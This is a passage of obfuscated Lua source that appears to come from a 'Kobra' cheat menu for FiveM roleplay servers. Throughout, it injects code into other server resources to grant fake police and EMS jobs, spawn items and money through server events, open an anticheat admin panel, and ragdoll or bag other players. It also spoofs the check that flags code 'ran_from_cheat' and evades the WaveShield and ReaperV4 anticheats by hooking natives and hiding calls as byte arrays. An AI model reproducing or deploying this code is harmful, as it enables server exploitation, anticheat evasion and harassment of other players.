[^3DEBUG^7]: Final itemCount =",v632);v633,v634=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v630,v632,v630,v632));end);v628=1917 -(1680 + 231) ;end if (v628==4) then if (v632>(6367 + 93633)) then local v1007=0 + 0 ;while true do if (v1007==(1149 -(212 + 937))) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v632=66621 + 33379 ;break;end end end v630=tostring(v630 or "" );v632=tonumber(v632 or (1063 -(111 + 951)) );v628=5;end if (v628==(2 + 4)) then if  not v633 then local v1008=27 -(18 + 9) ;while true do if (v1008==0) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v634);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v630),"itemCount =",tostring(v632));v1008=1 + 0 ;end if ((535 -(31 + 503))==v1008) then v12:Notify("error","Kobra","String format failed — check console",5632 -(595 + 1037) );break;end end else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v12:ShowUI();break;end end end});end local v294=GetResourceState("scripts")=="started" ;local v295=GetResourceState("framework")=="started" ;if (v294 or v295) then local v573=0;local v574;while true do if (v573==(1444 -(189 + 1255))) then v574=(v294 and "scripts") or "framework" ;v97({type="button",label="COMPLETE COMMS",onSelect=function() v12:Notify("Comserv","Kobra","Action Removed you might have to spam this",1109 + 1891 );MachoInjectResourceRaw(v574,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]]);end});break;end end end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v97({type="button",label="POLICE JOB (1)",onSelect=function() if (GetResourceState("es_extended")=="started") then local v817=0;while true do if (v817==(0 -0)) then v12:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end elseif (GetResourceState("core")=="started") then v12:Notify("Setjob","Kobra","Your job has been set to police",4279 -(1170 + 109) );MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="POLICE JOB (2)",onSelect=function() v12:Notify("Setjob","Kobra","You are now Police",4817 -(348 + 1469) );MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v97({type="button",label="COLLECT REWARDS",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 100000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v635) if v635 then v12:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",5289 -(1115 + 174) );v48("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);else v12:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",4000);v48("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);end end});end if (GetResourceState("rzrp-base")=="started") then v97({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v636) if v636 then print("Bag Closest Players Started...");v48("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);else local v818=0;while true do if (v818==0) then print("Bag Closest Players Stopped...");v48("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);break;end end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Force Gang",onSelect=function() local v637=0 -0 ;local v638;local v639;local v640;local v641;while true do if (v637==(1015 -(85 + 929))) then v60("Gang Name","",function(v954) if (v954 and (v954~="")) then v638=v954;end end,"typeable");Wait(1350 + 950 );v60("Gang Rank","",function(v955) if (v955 and (v955~="")) then v639=tonumber(v955) or 1 ;end end,"typeable");v637=2;end if (v637==0) then v638="";v639=1868 -(1151 + 716) ;v12:HideUI();v637=1;end if (v637==(1 + 1)) then Wait(976 + 24 );v640=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;v641=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v638,v639);v637=1707 -(95 + 1609) ;end if (v637==3) then v48(v640,v641);v12:ShowUI();v12:Notify("success","Kobra","Gang Set",14437 -10437 );break;end end end});end if (GetResourceState("framework")=="started") then v97({type="button",label="Give Item #2",onSelect=function() v12:HideUI();local function v642(v752,v753) local v754=758 -(364 + 394) ;local v755;local v756;while true do if (v754==(2 + 0)) then return v755;end if (0==v754) then v755=nil;v756=false;v754=1 + 0 ;end if (v754==(1 + 0)) then v60(v752,v753 or "" ,function(v1009) v755=v1009;v756=true;end,"typeable");while  not v756 do Wait(0 + 0 );end v754=2 + 0 ;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");local v643=v642("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v643));if ( not v643 or (v643=="")) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",3000);v12:ShowUI();return;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");local v644=v642("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v644));local v645=tonumber(v644);if ( not v645 or (v645<1)) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v645=1 + 0 ;end if (v645>(37617 + 62383)) then local v819=0 + 0 ;while true do if (v819==(0 + 0)) then print("^7[^5Kobra^7] [^1WARN^7]: That shit too high, stamping to 100000");v645=100956 -(719 + 237) ;break;end end end v643=tostring(v643 or "" );v645=tonumber(v645 or (2 -1) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v643);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v645);local v646,v647=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v643,v645));end);if  not v646 then local v820=0 + 0 ;while true do if (v820==0) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v647);v12:Notify("error","Kobra","String format failed — check console",4000);break;end end else local v821=0 -0 ;while true do if (v821==(0 -0)) then print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v12:Notify("success","Kobra","Item Sent",9506 -5506 );break;end end end v12:ShowUI();end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v97({type="button",label="COLLECT ITEMS 3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v97({type="button",label="Set Chat Tag",onSelect=function() local v648=1991 -(761 + 1230) ;local v649;local v650;local v651;local v652;while true do if (v648==(193 -(80 + 113))) then v12:HideUI();v649=nil;function v649(v956,v957) local v958=nil;local v959=false;v60(v956,v957 or "" ,function(v1010) local v1011=0 + 0 ;while true do if (v1011==(0 + 0)) then v958=v1010;v959=true;break;end end end,"typeable");while  not v959 do Wait(0);end return v958;end v650=v649("Chat Tag Name","");v648=1 + 0 ;end if (v648==(7 -5)) then Wait(116 + 384 );v652=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v652,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v650,v651));v12:ShowUI();break;end if (v648==1) then if ( not v650 or (v650=="")) then v12:ShowUI();return;end Wait(92 + 408 );v651=v649("Tag Color (R, G, B)","0, 255, 0");if ( not v651 or (v651=="")) then v651="255, 255, 255";end v648=2;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="POLICE JOB (3)",onSelect=function() local v653=1243 -(965 + 278) ;while true do if (v653==(1729 -(1391 + 338))) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v97({type="button",label="EMS JOB (1)",onSelect=function() MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);end});end if (GetResourceState("ElectronAC")=="started") then v97({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v97({type="button",label="Collect Cash",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v60("Choose Menu Key","",function(v480) for v575,v576 in pairs(v44) do if (v576:lower()==v480:lower()) then v23=v576;Wait(250);v12:ShowUI();return;end end end,"keybind");local v296=0 -0 ;local v297=117 + 3 ;while true do Wait(0 -0 );if v32 then local v654=v38[v39];if IsControlJustReleased(0 + 0 ,1422 -(496 + 912) ) then v39=(v39% #v38) + (3 -2) ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="down"}));end if IsControlJustReleased(0 + 0 ,15) then v39=((v39-(3 -1))% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="up"}));end if (v654=="Shoot Weapon") then local v822=1330 -(1190 + 140) ;while true do if (v822==(0 + 0)) then if IsDisabledControlJustPressed(718 -(317 + 401) ,993 -(303 + 646) ) then v34=((v34-(6 -4))% #v36) + (1733 -(1675 + 57)) ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end if IsDisabledControlJustPressed(0,25 + 13 ) then local v1118=0 -0 ;while true do if (v1118==(0 + 0)) then v34=(v34% #v36) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));break;end end end break;end end elseif (v654=="Spawn Car") then local v960=0;while true do if (v960==(977 -(338 + 639))) then if IsDisabledControlJustPressed(379 -(320 + 59) ,23 + 21 ) then v35=((v35-(734 -(628 + 104)))% #v37) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));end if IsDisabledControlJustPressed(0 -0 ,1929 -(439 + 1452) ) then local v1234=1947 -(105 + 1842) ;while true do if (0==v1234) then v35=(v35% #v37) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));break;end end end break;end end end if IsDisabledControlPressed(0,109 -85 ) then local v823=v654;if (v823=="Shoot Weapon") then local v961=0 -0 ;local v962;while true do if (v961==(4 -3)) then if (v962~=v33) then v33=v962;print(("weapon: %s, LastWeaponFired: %s"):format(v962,v33));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local function v1512(v1538) local v1539=0 + 0 ;local v1540;local v1541;local v1542;while true do if (v1539==(0 -0)) then v1540=math.rad(v1538.z);v1541=math.rad(v1538.x);v1539=1 + 0 ;end if (v1539==(1165 -(274 + 890))) then v1542=math.abs(math.cos(v1541));return vector3( -math.sin(v1540) * v1542 ,math.cos(v1540) * v1542 ,math.sin(v1541));end end end function hNative(v1543,v1544) local v1545=0;local v1546;while true do if (v1545==0) then v1546=_G[v1543];if ( not v1546 or (type(v1546)~="function")) then return;end v1545=1;end if (v1545==(1 + 0)) then _G[v1543]=function(...) return v1544(v1546,...);end;break;end end end hNative("CreateThread",function(v1547,...) return v1547(...);end);hNative("Wait",function(v1548,...) return v1548(...);end);hNative("PlayerPedId",function(v1549,...) return v1549(...);end);hNative("GetHashKey",function(v1550,...) return v1550(...);end);hNative("GiveWeaponToPed",function(v1551,...) return v1551(...);end);hNative("SetCurrentPedWeapon",function(v1552,...) return v1552(...);end);hNative("GetCurrentPedWeapon",function(v1553,...) return v1553(...);end);hNative("RemoveWeaponFromPed",function(v1554,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1555,...) return v1555(...);end);local v1513=GetCamCoord(_G.KobraFreecamObject);local v1514=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1515=v1512(v1514);local v1516=280 + 720 ;local v1517=v1513 + (v1515 * v1516) ;local v1518=PlayerPedId();local v1519=GetHashKey(v962);local function v1520(v1556) local v1557={};for v1578=1 + 0 , #v1556 do v1557[v1578]=string.byte(v1556,v1578);end return table.concat(v1557,",");end local v1521=v1520(v962);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1518,v1521));Wait(350);ShootSingleBulletBetweenCoords(v1513.x,v1513.y,v1513.z,v1517.x,v1517.y,v1517.z,59 + 41 ,true,v1519,PlayerPedId(),true,false,100000);end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v962   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1398(v1455) local v1456=math.rad(v1455.z);local v1457=math.rad(v1455.x);local v1458=math.abs(math.cos(v1457));return vector3( -math.sin(v1456) * v1458 ,math.cos(v1456) * v1458 ,math.sin(v1457));end function hNative(v1459,v1460) local v1461=0 -0 ;local v1462;while true do if (v1461==1) then _G[v1459]=function(...) return v1460(v1462,...);end;break;end if (v1461==(819 -(731 + 88))) then v1462=_G[v1459];if ( not v1462 or (type(v1462)~="function")) then return;end v1461=1 + 0 ;end end end hNative("CreateThread",function(v1463,...) return v1463(...);end);hNative("Wait",function(v1464,...) return v1464(...);end);hNative("PlayerPedId",function(v1465,...) return v1465(...);end);hNative("GetHashKey",function(v1466,...) return v1466(...);end);hNative("GiveWeaponToPed",function(v1467,...) return v1467(...);end);hNative("SetCurrentPedWeapon",function(v1468,...) return v1468(...);end);hNative("GetCurrentPedWeapon",function(v1469,...) return v1469(...);end);hNative("RemoveWeaponFromPed",function(v1470,...) return;end);local v1399=GetCamCoord(_G.KobraFreecamObject);local v1400=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1401=v1398(v1400);local v1402=1000;local v1403=v1399 + (v1401 * v1402) ;local v1404=PlayerPedId();local v1405=GetHashKey(v962);GiveWeaponToPed(v1404,v1405,255,false,true);MachoInjectThread(0 + 0 ,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1405   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );Wait(365 -115 );ShootSingleBulletBetweenCoords(v1399.x,v1399.y,v1399.z,v1403.x,v1403.y,v1403.z,311 -211 ,true,v1405,v1404,true,false,100000);end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then print("UPP3R");local function v1522(v1558) local v1559=math.rad(v1558.z);local v1560=math.rad(v1558.x);local v1561=math.abs(math.cos(v1560));return vector3( -math.sin(v1559) * v1561 ,math.cos(v1559) * v1561 ,math.sin(v1560));end function hNative(v1562,v1563) local v1564=_G[v1562];if ( not v1564 or (type(v1564)~="function")) then return;end _G[v1562]=function(...) return v1563(v1564,...);end;end hNative("CreateThread",function(v1565,...) return v1565(...);end);hNative("Wait",function(v1566,...) return v1566(...);end);hNative("PlayerPedId",function(v1567,...) return v1567(...);end);hNative("GetHashKey",function(v1568,...) return v1568(...);end);hNative("GiveWeaponToPed",function(v1569,...) return v1569(...);end);hNative("SetCurrentPedWeapon",function(v1570,...) return v1570(...);end);hNative("GetCurrentPedWeapon",function(v1571,...) return v1571(...);end);hNative("RemoveWeaponFromPed",function(v1572,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1573,...) return v1573(...);end);local v1523=GetCamCoord(_G.KobraFreecamObject);local v1524=GetCamRot(_G.KobraFreecamObject,5 -3 );local v1525=v1522(v1524);local v1526=1000;local v1527=v1523 + (v1525 * v1526) ;local v1528=PlayerPedId();local v1529=GetHashKey(v962);local function v1530(v1574) local v1575={};for v1580=1, #v1574 do v1575[v1580]=string.byte(v1574,v1580);end return table.concat(v1575,",");end local v1531=v1530(v962);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
